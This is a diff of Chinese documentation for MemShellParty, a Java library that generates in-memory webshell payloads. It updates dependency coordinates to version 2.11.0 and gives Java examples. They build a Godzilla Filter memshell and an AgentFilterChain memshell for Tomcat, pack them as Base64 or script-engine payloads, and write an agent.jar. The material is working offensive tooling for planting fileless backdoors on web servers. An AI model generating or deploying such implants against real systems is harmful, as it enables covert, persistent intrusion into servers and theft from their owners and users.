@@ -6,57 +6,111 @@ description: 适合集成到已有工具中，实现内存马 payload 的生成�
 
 import { Tab, Tabs } from "fumadocs-ui/components/tabs";
 
-> 具体代码可参考 [examples](https://github.com/ReaJason/MemShellParty/tree/master/examples)
+> 具体代码可参考 [examples](https://github.com/ReaJason/MemShellParty/tree/master/memshell-party-examples)
 
 ### 添加依赖
 
-1. 如果仅需要生成内存马 Base64 格式，仅添加 generator 模块即可
+1. 生成引擎：`memshell-party-core`（传递引入 `memshell-party-api` 与 `memshell-party-common`）
 
 <Tabs items={["Maven", "Gradle"]}>
   <Tab>
     ```xml
     <dependency>
       <groupId>io.github.reajason</groupId>
-      <artifactId>generator</artifactId>
-      <version>2.2.0</version>
+      <artifactId>memshell-party-core</artifactId>
+      <version>2.11.0</version>
     </dependency>
     ```
   </Tab>
   <Tab>
       ```groovy
-      implementation 'io.github.reajason:generator:2.2.0'
+      implementation 'io.github.reajason:memshell-party-core:2.11.0'
       ```
   </Tab>
 </Tabs>
 
-2. 如果需要使用自带的丰富打包方式，需要额外添加 packer 模块
+2. 按需添加要生成的 server 和 shell 工具模块，各自通过 SPI 自动注册；也可以用聚合模块一次性引入全部
+
+<Tabs items={["Maven", "Gradle"]}>
+  <Tab>
+    ```xml
+    <!-- 只生成 Tomcat + Godzilla -->
+    <dependency>
+      <groupId>io.github.reajason</groupId>
+      <artifactId>memshell-party-server-tomcat</artifactId>
+      <version>2.11.0</version>
+    </dependency>
+    <dependency>
+      <groupId>io.github.reajason</groupId>
+      <artifactId>memshell-party-shelltool-godzilla</artifactId>
+      <version>2.11.0</version>
+    </dependency>
+
+    <!-- 或者：全部 server / 全部 shell 工具 -->
+    <dependency>
+      <groupId>io.github.reajason</groupId>
+      <artifactId>memshell-party-server-all</artifactId>
+      <version>2.11.0</version>
+    </dependency>
+    <dependency>
+      <groupId>io.github.reajason</groupId>
+      <artifactId>memshell-party-shelltool-all</artifactId>
+      <version>2.11.0</version>
+    </dependency>
+    ```
+  </Tab>
+  <Tab>
+  ```groovy
+  implementation 'io.github.reajason:memshell-party-server-tomcat:2.11.0'
+  implementation 'io.github.reajason:memshell-party-shelltool-godzilla:2.11.0'
+  ```
+  </Tab>
+</Tabs>
+
+3. 如果需要使用自带的丰富打包方式，需要额外添加 `memshell-party-packer` 模块
 
 <Tabs items={["Maven", "Gradle"]}>
   <Tab>
     ```xml
     <dependency>
       <groupId>io.github.reajason</groupId>
-      <artifactId>generator</artifactId>
-      <version>2.2.0</version>
-    </dependency>
-    <dependency>
-      <groupId>io.github.reajason</groupId>
-      <artifactId>packer</artifactId>
-      <version>2.2.0</version>
+      <artifactId>memshell-party-packer</artifactId>
+      <version>2.11.0</version>
     </dependency>
     ```
   </Tab>
   <Tab>
   ```groovy
-  implementation 'io.github.reajason:generator:2.2.0'
-  implementation 'io.github.reajason:packer:2.2.0'
+  implementation 'io.github.reajason:memshell-party-packer:2.11.0'
   ```
   </Tab>
 </Tabs>
 
+4. 生成期 API 依赖：内存马模板的父类/接口需要能以**字节形式**解析（只解析签名，不会加载进 JVM），
+   需要用到的 API 请自行添加，例如生成 Tomcat 的 `Filter`/`Valve` 时：
+
+```xml
+<dependency>
+  <groupId>javax.servlet</groupId>
+  <artifactId>javax.servlet-api</artifactId>
+  <version>3.0.1</version>
+</dependency>
+<dependency>
+  <groupId>org.apache.tomcat.embed</groupId>
+  <artifactId>tomcat-embed-core</artifactId>
+  <version>8.5.85</version>
+</dependency>
+```
+
+> 这类 API 特意不作为 server/shelltool 模块的传递依赖，避免不相关的 server（spring、dubbo、reactor 等）
+> 被一起引入。目标机器上没有真实 Jetty 时，可用 `memshell-party-stub-jetty` 提供 `Handler`/`Customizer` 等签名。
+
 ### 生成 Tomcat Godzilla Filter 内存马示例
 
 ```java
+import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
+import com.reajason.javaweb.packer.ClassPackerConfig;
+
 ShellConfig shellConfig = ShellConfig.builder()
         .server(Server.Tomcat)
         .shellTool(ShellTool.Godzilla)
@@ -78,7 +132,7 @@ GodzillaConfig godzillaConfig = GodzillaConfig.builder()
 //                .headerValue("test")
         .build();
 
-GenerateResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
+MemShellResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
 
 System.out.println("注入器类名："+result.getInjectorClassName());
 System.out.println("内存马类名："+result.getShellClassName());
@@ -86,8 +140,8 @@ System.out.println("内存马类名："+result.getShellClassName());
 System.out.println(result.getShellConfig());
 System.out.println(result.getShellToolConfig());
 
-System.out.println("Base64 打包："+Packers.Base64.getInstance().pack(result));
-System.out.println("脚本引擎打包："+Packers.ScriptEngine.getInstance().pack(result));
+System.out.println("Base64 打包："+Packers.Base64.getInstance().pack(ClassPackerConfig.from(result)));
+System.out.println("脚本引擎打包："+Packers.ScriptEngine.getInstance().pack(ClassPackerConfig.from(result)));
 ```
 
 ### 生成 Tomcat Godzilla AgentFilterChain 示例
@@ -114,7 +168,7 @@ GodzillaConfig godzillaConfig = GodzillaConfig.builder()
 //                .headerValue("test")
         .build();
 
-GenerateResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
+MemShellResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
 
 System.out.println("注入器类名：" + result.getInjectorClassName());
 System.out.println("内存马类名：" + result.getShellClassName());
@@ -122,8 +176,8 @@ System.out.println("内存马类名：" + result.getShellClassName());
 System.out.println(result.getShellConfig());
 System.out.println(result.getShellToolConfig());
 
-byte[] agentJarBytes = ((JarPacker) Packers.AgentJar.getInstance()).packBytes(result);
+byte[] agentJarBytes = ((JarPacker) Packers.AgentJar.getInstance()).packBytes(JarPackerConfig.from(result));
 Files.write(Paths.get("agent.jar"), agentJarBytes);
 ```
 
-**封装统一生成接口可参考 [MemShellGeneratorController.java](https://github.com/ReaJason/MemShellParty/blob/master/boot/src/main/java/com/reajason/javaweb/boot/controller/MemShellGeneratorController.java)**
+**封装统一生成接口可参考 [MemShellGeneratorController.java](https://github.com/ReaJason/MemShellParty/blob/master/memshell-party-boot/src/main/java/com/reajason/javaweb/boot/controller/MemShellGeneratorController.java)**
